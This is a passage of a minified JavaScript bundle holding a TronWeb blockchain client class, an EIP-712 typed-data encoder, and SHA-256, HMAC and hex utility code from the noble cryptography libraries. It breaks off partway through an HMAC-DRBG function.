const CW = "4.7.1"
  , abe = 15e7
  , cbe = "6.0.3";
function SW(r) {
    return !!r && typeof r == "object" && (!!r.fullNode || !!r.fullHost)
}
const fr = class fr extends K0e {
    constructor(t, o="", i, n="") {
        super();
        we(this, "providers");
        we(this, "BigNumber");
        we(this, "transactionBuilder");
        we(this, "trx");
        we(this, "plugin");
        we(this, "event");
        we(this, "version");
        we(this, "utils");
        we(this, "defaultBlock");
        we(this, "defaultPrivateKey");
        we(this, "defaultAddress");
        we(this, "fullnodeVersion");
        we(this, "feeLimit");
        we(this, "fullNode");
        we(this, "solidityNode");
        we(this, "eventServer");
        we(this, "address");
        we(this, "sha3");
        we(this, "toHex");
        we(this, "toUtf8");
        we(this, "fromUtf8");
        we(this, "toAscii");
        we(this, "fromAscii");
        we(this, "toDecimal");
        we(this, "fromDecimal");
        we(this, "fromSun");
        we(this, "toSun");
        we(this, "toBigNumber");
        we(this, "isAddress");
        we(this, "createAccount");
        we(this, "createRandom");
        we(this, "fromMnemonic");
        let s, a = !1, l = !1;
        SW(t) ? (s = t.fullNode || t.fullHost,
        o = t.solidityNode || t.fullHost,
        i = t.eventServer || t.fullHost,
        a = t.headers || !1,
        l = t.eventHeaders || a,
        n = t.privateKey) : s = t,
        tt.isString(s) && (s = new ei.HttpProvider(s)),
        tt.isString(o) && (o = new ei.HttpProvider(o)),
        tt.isString(i) && (i = new ei.HttpProvider(i)),
        this.event = new sbe(this),
        this.transactionBuilder = new tbe(this),
        this.trx = new Ca(this),
        this.plugin = new ibe(this,{
            disablePlugins: SW(t) ? t.disablePlugins : !1
        }),
        this.utils = tt,
        this.setFullNode(s),
        this.setSolidityNode(o),
        this.setEventServer(i),
        this.providers = ei,
        this.BigNumber = Cm,
        this.defaultBlock = !1,
        this.defaultPrivateKey = !1,
        this.defaultAddress = {
            hex: !1,
            base58: !1
        },
        this.version = fr.version,
        this.sha3 = fr.sha3,
        this.fromUtf8 = fr.fromUtf8,
        this.address = fr.address,
        this.toAscii = fr.toAscii,
        this.toUtf8 = fr.toUtf8,
        this.isAddress = fr.isAddress,
        this.fromAscii = fr.fromAscii,
        this.toHex = fr.toHex,
        this.toBigNumber = fr.toBigNumber,
        this.toDecimal = fr.toDecimal,
        this.fromDecimal = fr.fromDecimal,
        this.toSun = fr.toSun,
        this.fromSun = fr.fromSun,
        this.createAccount = fr.createAccount,
        this.createRandom = fr.createRandom,
        this.fromMnemonic = fr.fromMnemonic,
        n && this.setPrivateKey(n),
        this.fullnodeVersion = CW,
        this.feeLimit = abe,
        a && this.setFullNodeHeader(a),
        l && this.setEventHeader(l)
    }
    async getFullnodeVersion() {
        try {
            const t = await this.trx.getNodeInfo();
            this.fullnodeVersion = t.configNodeInfo.codeVersion,
            this.fullnodeVersion.split(".").length === 2 && (this.fullnodeVersion += ".0")
        } catch {
            this.fullnodeVersion = CW
        }
    }
    setDefaultBlock(t=!1) {
        if ([!1, "latest", "earliest", 0].includes(t))
            return this.defaultBlock = t;
        if (!tt.isInteger(t) || !t)
            throw new Error("Invalid block ID provided");
        return this.defaultBlock = Math.abs(t)
    }
    setPrivateKey(t) {
        try {
            this.setAddress(fr.address.fromPrivateKey(t))
        } catch {
            throw new Error("Invalid private key provided")
        }
        this.defaultPrivateKey = t,
        this.emit("privateKeyChanged", t)
    }
    setAddress(t) {
        if (!fr.isAddress(t))
            throw new Error("Invalid address provided");
        const o = fr.address.toHex(t)
          , i = fr.address.fromHex(t);
        this.defaultPrivateKey && fr.address.fromPrivateKey(this.defaultPrivateKey) !== i && (this.defaultPrivateKey = !1),
        this.defaultAddress = {
            hex: o,
            base58: i
        },
        this.emit("addressChanged", {
            hex: o,
            base58: i
        })
    }
    fullnodeSatisfies(t) {
        return xU.satisfies(this.fullnodeVersion, t)
    }
    isValidProvider(t) {
        return Object.values(ei).some(o => t instanceof o)
    }
    setFullNode(t) {
        if (fo(t) && (t = new ei.HttpProvider(t)),
        !this.isValidProvider(t))
            throw new Error("Invalid full node provided");
        this.fullNode = t,
        this.fullNode.setStatusPage("wallet/getnowblock")
    }
    setSolidityNode(t) {
        if (tt.isString(t) && (t = new ei.HttpProvider(t)),
        !this.isValidProvider(t))
            throw new Error("Invalid solidity node provided");
        this.solidityNode = t,
        this.solidityNode.setStatusPage("walletsolidity/getnowblock")
    }
    setEventServer(t, o) {
        this.event.setServer(t, o)
    }
    setHeader(t={}) {
        const o = new ei.HttpProvider(this.fullNode.host,3e4,"","",t)
          , i = new ei.HttpProvider(this.solidityNode.host,3e4,"","",t)
          , n = new ei.HttpProvider(this.eventServer.host,3e4,"","",t);
        this.setFullNode(o),
        this.setSolidityNode(i),
        this.setEventServer(n)
    }
    setFullNodeHeader(t={}) {
        const o = new ei.HttpProvider(this.fullNode.host,3e4,"","",t)
          , i = new ei.HttpProvider(this.solidityNode.host,3e4,"","",t);
        this.setFullNode(o),
        this.setSolidityNode(i)
    }
    setEventHeader(t={}) {
        const o = new ei.HttpProvider(this.eventServer.host,3e4,"","",t);
        this.setEventServer(o)
    }
    currentProviders() {
        return {
            fullNode: this.fullNode,
            solidityNode: this.solidityNode,
            eventServer: this.eventServer
        }
    }
    currentProvider() {
        return this.currentProviders()
    }
    getEventResult(...t) {
        return this.event.getEventsByContractAddress(...t)
    }
    getEventByTransactionID(...t) {
        return this.event.getEventsByTransactionID(...t)
    }
    contract(t=[], o) {
        return new obe(this,t,o)
    }
    static get address() {
        return {
            fromHex(t) {
                return LF(t)
            },
            toHex(t) {
                return gt(t)
            },
            toChecksumAddress(t) {
                return p4(t)
            },
            isChecksumAddress(t) {
                return $F(t)
            },
            fromPrivateKey(t, o=!1) {
                return zF(t, o)
            }
        }
    }
    static sha3(t, o=!0) {
        return (o ? "0x" : "") + ir(Buffer.from(t, "utf-8")).toString().substring(2)
    }
    static toHex(t) {
        if (tt.isBoolean(t))
            return fr.fromDecimal(+t);
        if (tt.isBigNumber(t))
            return fr.fromDecimal(t);
        if (typeof t == "object")
            return fr.fromUtf8(JSON.stringify(t));
        if (tt.isString(t)) {
            if (/^(-|)0x/.test(t))
                return t;
            if (!isFinite(t) || /^\s*$/.test(t))
                return fr.fromUtf8(t)
        }
        const o = fr.fromDecimal(t);
        if (o === "0xNaN")
            throw new Error("The passed value is not convertible to a hex string");
        return o
    }
    static toUtf8(t) {
        if (tt.isHex(t))
            return t = t.replace(/^0x/, ""),
            Buffer.from(t, "hex").toString("utf8");
        throw new Error("The passed value is not a valid hex string")
    }
    static fromUtf8(t) {
        if (!tt.isString(t))
            throw new Error("The passed value is not a valid utf-8 string");
        return "0x" + Buffer.from(t, "utf8").toString("hex")
    }
    static toAscii(t) {
        if (tt.isHex(t)) {
            let o = ""
              , i = 0;
            const n = t.length;
            for (t.substring(0, 2) === "0x" && (i = 2); i < n; i += 2) {
                const s = parseInt(t.substr(i, 2), 16);
                o += String.fromCharCode(s)
            }
            return o
        } else
            throw new Error("The passed value is not a valid hex string")
    }
    static fromAscii(t, o) {
        if (!tt.isString(t))
            throw new Error("The passed value is not a valid utf-8 string");
        return "0x" + Buffer.from(t, "ascii").toString("hex").padEnd(o, "0")
    }
    static toDecimal(t) {
        return fr.toBigNumber(t).toNumber()
    }
    static fromDecimal(t) {
        const o = fr.toBigNumber(t)
          , i = o.toString(16);
        return o.isLessThan(0) ? "-0x" + i.substr(1) : "0x" + i
    }
    static fromSun(t) {
        const o = fr.toBigNumber(t).div(1e6);
        return tt.isBigNumber(t) ? o : o.toString(10)
    }
    static toSun(t) {
        const o = fr.toBigNumber(t).times(1e6);
        return tt.isBigNumber(t) ? o : o.toString(10)
    }
    static toBigNumber(t=0) {
        return tt.isBigNumber(t) ? t : tt.isString(t) && /^(-|)0x/.test(t) ? new Cm(t.replace("0x", ""),16) : new Cm(t.toString(10),10)
    }
    static isAddress(t="") {
        return M0(t)
    }
    static async createAccount() {
        return tt.accounts.generateAccount()
    }
    static createRandom(...t) {
        return tt.accounts.generateRandom(...t)
    }
    static fromMnemonic(...t) {
        return tt.accounts.generateAccountWithMnemonic(...t)
    }
    async isConnected() {
        return {
            fullNode: await this.fullNode.isConnected(),
            solidityNode: await this.solidityNode.isConnected(),
            eventServer: this.eventServer && await this.eventServer.isConnected()
        }
    }
}
;
we(fr, "version", cbe);
let or = fr;
function lbe(r) {
    return or.address.toHex(r).replace(Ld, "0x")
}
function ube(r) {
    return or.address.toHex(r)
}
const UU = new Uint8Array(32);
UU.fill(0);
const fbe = BigInt(-1)
  , kU = BigInt(0)
  , LU = BigInt(1)
  , dbe = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
function hbe(r) {
    const e = pt(r)
      , t = e.length % 32;
    return t ? Ar([e, UU.slice(t)]) : et(e)
}
const pbe = cs(LU, 32)
  , gbe = cs(kU, 32)
  , BW = {
    name: "string",
    version: "string",
    chainId: "uint256",
    verifyingContract: "address",
    salt: "bytes32"
}
  , nE = ["name", "version", "chainId", "verifyingContract", "salt"];
function _W(r) {
    return function(e) {
        return pe(typeof e == "string", `invalid domain value for ${JSON.stringify(r)}`, `domain.${r}`, e),
        e
    }
}
const ybe = {
    name: _W("name"),
    version: _W("version"),
    chainId: function(r) {
        const e = Er(r, "domain.chainId");
        return pe(e >= 0, "invalid chain ID", "domain.chainId", r),
        Number.isSafeInteger(e) ? Number(e) : t7(e)
    },
    verifyingContract: function(r) {
        try {
            return ube(r).toLowerCase()
        } catch {}
        pe(!1, 'invalid domain value "verifyingContract"', "domain.verifyingContract", r)
    },
    salt: function(r) {
        const e = pt(r, "domain.salt");
        return pe(e.length === 32, 'invalid domain value "salt"', "domain.salt", r),
        et(e)
    }
};
function $m(r) {
    {
        const e = r.match(/^(u?)int(\d*)$/);
        if (e) {
            const t = e[1] === ""
              , o = parseInt(e[2] || "256");
            pe(o % 8 === 0 && o !== 0 && o <= 256 && (e[2] == null || e[2] === String(o)), "invalid numeric width", "type", r);
            const i = Hf(dbe, t ? o - 1 : o)
              , n = t ? (i + LU) * fbe : kU;
            return function(s) {
                const a = Er(s, "value");
                return pe(a >= n && a <= i, `value out-of-bounds for ${r}`, "value", a),
                cs(t ? Z3(a, 256) : a, 32)
            }
        }
    }
    {
        const e = r.match(/^bytes(\d+)$/);
        if (e) {
            const t = parseInt(e[1]);
            return pe(t !== 0 && t <= 32 && e[1] === String(t), "invalid bytes width", "type", r),
            function(o) {
                const i = pt(o);
                return pe(i.length === t, `invalid length for ${r}`, "value", o),
                hbe(o)
            }
        }
    }
    switch (r) {
    case "trcToken":
        return $m("uint256");
    case "address":
        return function(e) {
            return qc(lbe(e), 32)
        }
        ;
    case "bool":
        return function(e) {
            return e ? pbe : gbe
        }
        ;
    case "bytes":
        return function(e) {
            return ir(e)
        }
        ;
    case "string":
        return function(e) {
            return ls(e)
        }
    }
    return null
}
function IW(r, e) {
    return `${r}(${e.map( ({name: t, type: o}) => o + " " + t).join(",")})`
}
var l0, Da, vd, w1, $U;
const Wi = class Wi {
    constructor(e) {
        ft(this, w1);
        we(this, "primaryType");
        ft(this, l0);
        ft(this, Da);
        ft(this, vd);
        He(this, l0, JSON.stringify(e)),
        He(this, Da, new Map),
        He(this, vd, new Map);
        const t = new Map
          , o = new Map
          , i = new Map;
        Object.keys(e).forEach(a => {
            t.set(a, new Set),
            o.set(a, []),
            i.set(a, new Set)
        }
        );
        for (const a in e) {
            const l = new Set;
            for (const f of e[a]) {
                pe(!l.has(f.name), `duplicate variable name ${JSON.stringify(f.name)} in ${JSON.stringify(a)}`, "types", e),
                l.add(f.name);
                const h = f.type.match(/^([^\x5b]*)(\x5b|$)/)[1] || null;
                pe(h !== a, `circular type reference to ${JSON.stringify(h)}`, "types", e),
                !$m(h) && (pe(o.has(h), `unknown type ${JSON.stringify(h)}`, "types", e),
                o.get(h).push(a),
                t.get(a).add(h))
            }
        }
        const n = Array.from(o.keys()).filter(a => o.get(a).length === 0);
        pe(n.length !== 0, "missing primary type", "types", e),
        pe(n.length === 1, `ambiguous primary types or unused types: ${n.map(a => JSON.stringify(a)).join(", ")}`, "types", e),
        tr(this, {
            primaryType: n[0]
        });
        function s(a, l) {
            pe(!l.has(a), `circular type reference to ${JSON.stringify(a)}`, "types", e),
            l.add(a);
            for (const f of t.get(a))
                if (o.has(f)) {
                    s(f, l);
                    for (const h of l)
                        i.get(h).add(f)
                }
            l.delete(a)
        }
        s(this.primaryType, new Set);
        for (const [a,l] of i) {
            const f = Array.from(l);
            f.sort(),
            Ae(this, Da).set(a, IW(a, e[a]) + f.map(h => IW(h, e[h])).join(""))
        }
    }
    get types() {
        return JSON.parse(Ae(this, l0))
    }
    getEncoder(e) {
        let t = Ae(this, vd).get(e);
        return t || (t = Dt(this, w1, $U).call(this, e),
        Ae(this, vd).set(e, t)),
        t
    }
    encodeType(e) {
        const t = Ae(this, Da).get(e);
        return pe(t, `unknown type: ${JSON.stringify(e)}`, "name", e),
        t
    }
    encodeData(e, t) {
        return this.getEncoder(e)(t)
    }
    hashStruct(e, t) {
        return ir(this.encodeData(e, t))
    }
    encode(e) {
        return this.encodeData(this.primaryType, e)
    }
    hash(e) {
        return this.hashStruct(this.primaryType, e)
    }
    _visit(e, t, o) {
        if ($m(e))
            return o(e, t);
        const i = e.match(/^(.*)(\x5b(\d*)\x5d)$/);
        if (i)
            return pe(!i[3] || parseInt(i[3]) === t.length, `array length mismatch; expected length ${parseInt(i[3])}`, "value", t),
            t.map(s => this._visit(i[1], s, o));
        const n = this.types[e];
        if (n)
            return n.reduce( (s, {name: a, type: l}) => (s[a] = this._visit(l, t[a], o),
            s), {});
        pe(!1, `unknown type: ${e}`, "type", e)
    }
    visit(e, t) {
        return this._visit(this.primaryType, e, t)
    }
    static from(e) {
        return new Wi(e)
    }
    static getPrimaryType(e) {
        return Wi.from(e).primaryType
    }
    static hashStruct(e, t, o) {
        return Wi.from(t).hashStruct(e, o)
    }
    static hashDomain(e) {
        const t = [];
        for (const o in e) {
            if (e[o] == null)
                continue;
            const i = BW[o];
            pe(i, `invalid typed-data domain key: ${JSON.stringify(o)}`, "domain", e),
            t.push({
                name: o,
                type: i
            })
        }
        return t.sort( (o, i) => nE.indexOf(o.name) - nE.indexOf(i.name)),
        Wi.hashStruct("EIP712Domain", {
            EIP712Domain: t
        }, e)
    }
    static encode(e, t, o) {
        return Ar(["0x1901", Wi.hashDomain(e), Wi.from(t).hash(o)])
    }
    static hash(e, t, o) {
        return ir(Wi.encode(e, t, o))
    }
    static async resolveNames(e, t, o, i) {
        e = Object.assign({}, e);
        for (const a in e)
            e[a] == null && delete e[a];
        const n = {};
        e.verifyingContract && !ro(e.verifyingContract, 20) && (n[e.verifyingContract] = "0x");
        const s = Wi.from(t);
        s.visit(o, (a, l) => (a === "address" && !ro(l, 20) && (n[l] = "0x"),
        l));
        for (const a in n)
            n[a] = await i(a);
        return e.verifyingContract && n[e.verifyingContract] && (e.verifyingContract = n[e.verifyingContract]),
        o = s.visit(o, (a, l) => a === "address" && n[l] ? n[l] : l),
        {
            domain: e,
            value: o
        }
    }
    static getPayload(e, t, o) {
        Wi.hashDomain(e);
        const i = {}
          , n = [];
        nE.forEach(l => {
            const f = e[l];
            f != null && (i[l] = ybe[l](f),
            n.push({
                name: l,
                type: BW[l]
            }))
        }
        );
        const s = Wi.from(t)
          , a = Object.assign({}, t);
        return pe(a.EIP712Domain == null, "types must not contain EIP712Domain type", "types.EIP712Domain", t),
        a.EIP712Domain = n,
        s.encode(o),
        {
            types: a,
            domain: i,
            primaryType: s.primaryType,
            message: s.visit(o, (l, f) => {
                if (l.match(/^bytes(\d*)/))
                    return et(pt(f));
                if (l.match(/^u?int/))
                    return Er(f).toString();
                switch (l) {
                case "trcToken":
                    return Er(f).toString();
                case "address":
                    return f.toLowerCase();
                case "bool":
                    return !!f;
                case "string":
                    return pe(typeof f == "string", "invalid string", "value", f),
                    f
                }
                pe(!1, "unsupported type", "type", l)
            }
            )
        }
    }
}
;
l0 = new WeakMap,
Da = new WeakMap,
vd = new WeakMap,
w1 = new WeakSet,
$U = function(e) {
    {
        const i = $m(e);
        if (i)
            return i
    }
    const t = e.match(/^(.*)(\x5b(\d*)\x5d)$/);
    if (t) {
        const i = t[1]
          , n = this.getEncoder(i);
        return s => {
            pe(!t[3] || parseInt(t[3]) === s.length, `array length mismatch; expected length ${parseInt(t[3])}`, "value", s);
            let a = s.map(n);
            return Ae(this, Da).has(i) && (a = a.map(ir)),
            ir(Ar(a))
        }
    }
    const o = this.types[e];
    if (o) {
        const i = ls(Ae(this, Da).get(e));
        return n => {
            const s = o.map( ({name: a, type: l}) => {
                const f = this.getEncoder(l)(n[a]);
                return Ae(this, Da).has(l) ? ir(f) : f
            }
            );
            return s.unshift(i),
            Ar(s)
        }
    }
    pe(!1, `unknown type: ${e}`, "type", e)
}
;
let y1 = Wi;
function OW(r) {
    if (!Number.isSafeInteger(r) || r < 0)
        throw new Error(`positive integer expected, not ${r}`)
}
function bbe(r) {
    return r instanceof Uint8Array || r != null && typeof r == "object" && r.constructor.name === "Uint8Array"
}
function bx(r, ...e) {
    if (!bbe(r))
        throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(r.length))
        throw new Error(`Uint8Array expected of length ${e}, not of length=${r.length}`)
}
function mbe(r) {
    if (typeof r != "function" || typeof r.create != "function")
        throw new Error("Hash should be wrapped by utils.wrapConstructor");
    OW(r.outputLen),
    OW(r.blockLen)
}
function b1(r, e=!0) {
    if (r.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (e && r.finished)
        throw new Error("Hash#digest() has already been called")
}
function xbe(r, e) {
    bx(r);
    const t = e.outputLen;
    if (r.length < t)
        throw new Error(`digestInto() expects output buffer of length at least ${t}`)
}
const oE = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const iE = r => new DataView(r.buffer,r.byteOffset,r.byteLength)
  , Rs = (r, e) => r << 32 - e | r >>> e;
new Uint8Array(new Uint32Array([287454020]).buffer)[0];
function wbe(r) {
    if (typeof r != "string")
        throw new Error(`utf8ToBytes expected string, got ${typeof r}`);
    return new Uint8Array(new TextEncoder().encode(r))
}
function S4(r) {
    return typeof r == "string" && (r = wbe(r)),
    bx(r),
    r
}
function vbe(...r) {
    let e = 0;
    for (let o = 0; o < r.length; o++) {
        const i = r[o];
        bx(i),
        e += i.length
    }
    const t = new Uint8Array(e);
    for (let o = 0, i = 0; o < r.length; o++) {
        const n = r[o];
        t.set(n, i),
        i += n.length
    }
    return t
}
class zU {
    clone() {
        return this._cloneInto()
    }
}
function Tbe(r) {
    const e = o => r().update(S4(o)).digest()
      , t = r();
    return e.outputLen = t.outputLen,
    e.blockLen = t.blockLen,
    e.create = () => r(),
    e
}
function Ebe(r=32) {
    if (oE && typeof oE.getRandomValues == "function")
        return oE.getRandomValues(new Uint8Array(r));
    throw new Error("crypto.getRandomValues must be defined")
}
function Abe(r, e, t, o) {
    if (typeof r.setBigUint64 == "function")
        return r.setBigUint64(e, t, o);
    const i = BigInt(32)
      , n = BigInt(4294967295)
      , s = Number(t >> i & n)
      , a = Number(t & n)
      , l = o ? 4 : 0
      , f = o ? 0 : 4;
    r.setUint32(e + l, s, o),
    r.setUint32(e + f, a, o)
}
const Pbe = (r, e, t) => r & e ^ ~r & t
  , Cbe = (r, e, t) => r & e ^ r & t ^ e & t;
class Sbe extends zU {
    constructor(e, t, o, i) {
        super(),
        this.blockLen = e,
        this.outputLen = t,
        this.padOffset = o,
        this.isLE = i,
        this.finished = !1,
        this.length = 0,
        this.pos = 0,
        this.destroyed = !1,
        this.buffer = new Uint8Array(e),
        this.view = iE(this.buffer)
    }
    update(e) {
        b1(this);
        const {view: t, buffer: o, blockLen: i} = this;
        e = S4(e);
        const n = e.length;
        for (let s = 0; s < n; ) {
            const a = Math.min(i - this.pos, n - s);
            if (a === i) {
                const l = iE(e);
                for (; i <= n - s; s += i)
                    this.process(l, s);
                continue
            }
            o.set(e.subarray(s, s + a), this.pos),
            this.pos += a,
            s += a,
            this.pos === i && (this.process(t, 0),
            this.pos = 0)
        }
        return this.length += e.length,
        this.roundClean(),
        this
    }
    digestInto(e) {
        b1(this),
        xbe(e, this),
        this.finished = !0;
        const {buffer: t, view: o, blockLen: i, isLE: n} = this;
        let {pos: s} = this;
        t[s++] = 128,
        this.buffer.subarray(s).fill(0),
        this.padOffset > i - s && (this.process(o, 0),
        s = 0);
        for (let p = s; p < i; p++)
            t[p] = 0;
        Abe(o, i - 8, BigInt(this.length * 8), n),
        this.process(o, 0);
        const a = iE(e)
          , l = this.outputLen;
        if (l % 4)
            throw new Error("_sha2: outputLen should be aligned to 32bit");
        const f = l / 4
          , h = this.get();
        if (f > h.length)
            throw new Error("_sha2: outputLen bigger than state");
        for (let p = 0; p < f; p++)
            a.setUint32(4 * p, h[p], n)
    }
    digest() {
        const {buffer: e, outputLen: t} = this;
        this.digestInto(e);
        const o = e.slice(0, t);
        return this.destroy(),
        o
    }
    _cloneInto(e) {
        e || (e = new this.constructor),
        e.set(...this.get());
        const {blockLen: t, buffer: o, length: i, finished: n, destroyed: s, pos: a} = this;
        return e.length = i,
        e.pos = a,
        e.finished = n,
        e.destroyed = s,
        i % t && e.buffer.set(o),
        e
    }
}
const Bbe = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
  , Bc = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
  , _c = new Uint32Array(64);
let _be = class extends Sbe {
    constructor() {
        super(64, 32, 8, !1),
        this.A = Bc[0] | 0,
        this.B = Bc[1] | 0,
        this.C = Bc[2] | 0,
        this.D = Bc[3] | 0,
        this.E = Bc[4] | 0,
        this.F = Bc[5] | 0,
        this.G = Bc[6] | 0,
        this.H = Bc[7] | 0
    }
    get() {
        const {A: e, B: t, C: o, D: i, E: n, F: s, G: a, H: l} = this;
        return [e, t, o, i, n, s, a, l]
    }
    set(e, t, o, i, n, s, a, l) {
        this.A = e | 0,
        this.B = t | 0,
        this.C = o | 0,
        this.D = i | 0,
        this.E = n | 0,
        this.F = s | 0,
        this.G = a | 0,
        this.H = l | 0
    }
    process(e, t) {
        for (let p = 0; p < 16; p++,
        t += 4)
            _c[p] = e.getUint32(t, !1);
        for (let p = 16; p < 64; p++) {
            const b = _c[p - 15]
              , v = _c[p - 2]
              , T = Rs(b, 7) ^ Rs(b, 18) ^ b >>> 3
              , x = Rs(v, 17) ^ Rs(v, 19) ^ v >>> 10;
            _c[p] = x + _c[p - 7] + T + _c[p - 16] | 0
        }
        let {A: o, B: i, C: n, D: s, E: a, F: l, G: f, H: h} = this;
        for (let p = 0; p < 64; p++) {
            const b = Rs(a, 6) ^ Rs(a, 11) ^ Rs(a, 25)
              , v = h + b + Pbe(a, l, f) + Bbe[p] + _c[p] | 0
              , x = (Rs(o, 2) ^ Rs(o, 13) ^ Rs(o, 22)) + Cbe(o, i, n) | 0;
            h = f,
            f = l,
            l = a,
            a = s + v | 0,
            s = n,
            n = i,
            i = o,
            o = v + x | 0
        }
        o = o + this.A | 0,
        i = i + this.B | 0,
        n = n + this.C | 0,
        s = s + this.D | 0,
        a = a + this.E | 0,
        l = l + this.F | 0,
        f = f + this.G | 0,
        h = h + this.H | 0,
        this.set(o, i, n, s, a, l, f, h)
    }
    roundClean() {
        _c.fill(0)
    }
    destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0),
        this.buffer.fill(0)
    }
}
;
const Ibe = Tbe( () => new _be);
class jU extends zU {
    constructor(e, t) {
        super(),
        this.finished = !1,
        this.destroyed = !1,
        mbe(e);
        const o = S4(t);
        if (this.iHash = e.create(),
        typeof this.iHash.update != "function")
            throw new Error("Expected instance of class which extends utils.Hash");
        this.blockLen = this.iHash.blockLen,
        this.outputLen = this.iHash.outputLen;
        const i = this.blockLen
          , n = new Uint8Array(i);
        n.set(o.length > i ? e.create().update(o).digest() : o);
        for (let s = 0; s < n.length; s++)
            n[s] ^= 54;
        this.iHash.update(n),
        this.oHash = e.create();
        for (let s = 0; s < n.length; s++)
            n[s] ^= 106;
        this.oHash.update(n),
        n.fill(0)
    }
    update(e) {
        return b1(this),
        this.iHash.update(e),
        this
    }
    digestInto(e) {
        b1(this),
        bx(e, this.outputLen),
        this.finished = !0,
        this.iHash.digestInto(e),
        this.oHash.update(e),
        this.oHash.digestInto(e),
        this.destroy()
    }
    digest() {
        const e = new Uint8Array(this.oHash.outputLen);
        return this.digestInto(e),
        e
    }
    _cloneInto(e) {
        e || (e = Object.create(Object.getPrototypeOf(this), {}));
        const {oHash: t, iHash: o, finished: i, destroyed: n, blockLen: s, outputLen: a} = this;
        return e = e,
        e.finished = i,
        e.destroyed = n,
        e.blockLen = s,
        e.outputLen = a,
        e.oHash = t._cloneInto(e.oHash),
        e.iHash = o._cloneInto(e.iHash),
        e
    }
    destroy() {
        this.destroyed = !0,
        this.oHash.destroy(),
        this.iHash.destroy()
    }
}
const qU = (r, e, t) => new jU(r,e).update(t).digest();
qU.create = (r, e) => new jU(r,e);
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const VU = BigInt(0)
  , mx = BigInt(1)
  , Obe = BigInt(2);
function xu(r) {
    return r instanceof Uint8Array || r != null && typeof r == "object" && r.constructor.name === "Uint8Array"
}
function U0(r) {
    if (!xu(r))
        throw new Error("Uint8Array expected")
}
const Rbe = Array.from({
    length: 256
}, (r, e) => e.toString(16).padStart(2, "0"));
function $d(r) {
    U0(r);
    let e = "";
    for (let t = 0; t < r.length; t++)
        e += Rbe[r[t]];
    return e
}
function HU(r) {
    const e = r.toString(16);
    return e.length & 1 ? `0${e}` : e
}
function B4(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    return BigInt(r === "" ? "0" : `0x${r}`)
}
const Ea = {
    _0: 48,
    _9: 57,
    _A: 65,
    _F: 70,
    _a: 97,
    _f: 102
};
function RW(r) {
    if (r >= Ea._0 && r <= Ea._9)
        return r - Ea._0;
    if (r >= Ea._A && r <= Ea._F)
        return r - (Ea._A - 10);
    if (r >= Ea._a && r <= Ea._f)
        return r - (Ea._a - 10)
}
function zd(r) {
    if (typeof r != "string")
        throw new Error("hex string expected, got " + typeof r);
    const e = r.length
      , t = e / 2;
    if (e % 2)
        throw new Error("padded hex string expected, got unpadded hex of length " + e);
    const o = new Uint8Array(t);
    for (let i = 0, n = 0; i < t; i++,
    n += 2) {
        const s = RW(r.charCodeAt(n))
          , a = RW(r.charCodeAt(n + 1));
        if (s === void 0 || a === void 0) {
            const l = r[n] + r[n + 1];
            throw new Error('hex string expected, got non-hex character "' + l + '" at index ' + n)
        }
        o[i] = s * 16 + a
    }
    return o
}
function su(r) {
    return B4($d(r))
}
function _4(r) {
    return U0(r),
    B4($d(Uint8Array.from(r).reverse()))
}
function jd(r, e) {
    return zd(r.toString(16).padStart(e * 2, "0"))
}
function I4(r, e) {
    return jd(r, e).reverse()
}
function Wbe(r) {
    return zd(HU(r))
}
function rs(r, e, t) {
    let o;
    if (typeof e == "string")
        try {
            o = zd(e)
        } catch (n) {
            throw new Error(`${r} must be valid hex string, got "${e}". Cause: ${n}`)
        }
    else if (xu(e))
        o = Uint8Array.from(e);
    else
        throw new Error(`${r} must be hex string or Uint8Array`);
    const i = o.length;
    if (typeof t == "number" && i !== t)
        throw new Error(`${r} expected ${t} bytes, got ${i}`);
    return o
}
function r0(...r) {
    let e = 0;
    for (let o = 0; o < r.length; o++) {
        const i = r[o];
        U0(i),
        e += i.length
    }
    const t = new Uint8Array(e);
    for (let o = 0, i = 0; o < r.length; o++) {
        const n = r[o];
        t.set(n, i),
        i += n.length
    }
    return t
}
function Mbe(r, e) {
    if (r.length !== e.length)
        return !1;
    let t = 0;
    for (let o = 0; o < r.length; o++)
        t |= r[o] ^ e[o];
    return t === 0
}
function Nbe(r) {
    if (typeof r != "string")
        throw new Error(`utf8ToBytes expected string, got ${typeof r}`);
    return new Uint8Array(new TextEncoder().encode(r))
}
function Dbe(r) {
    let e;
    for (e = 0; r > VU; r >>= mx,
    e += 1)
        ;
    return e
}
function Fbe(r, e) {
    return r >> BigInt(e) & mx
}
function Ube(r, e, t) {
    return r | (t ? mx : VU) << BigInt(e)
}
const O4 = r => (Obe << BigInt(r - 1)) - mx
  , sE = r => new Uint8Array(r)
  , WW = r => Uint8Array.from(r);
function GU(r, e, t) {
    if (typeof r != "number" || r < 2)
        throw new Error("hashLen must be a number");
    if (typeof e != "number" || e < 2)
        throw new Error("qByteLen must be a number");
    if (typeof t != "function")
        throw new Error("hmacFn must be a function");
    let o = sE(r)
      , i = sE(r)
      , n = 0;
    const s = () => {
        o.fill(1),
        i.fill(0),
        n = 0
    }
      , a = (...p) => t(i, o, ...p)
      , l = (p=sE()) => {
        i = a(WW([0]), p),
        o = a(),
        p.length !== 0 && (i = a(WW([1]), p),
        o = a())
    }
      , f = () => {
        if (n++ >= 1e3)
            throw new Error("drbg: tried 1000 values");
        let p = 0;
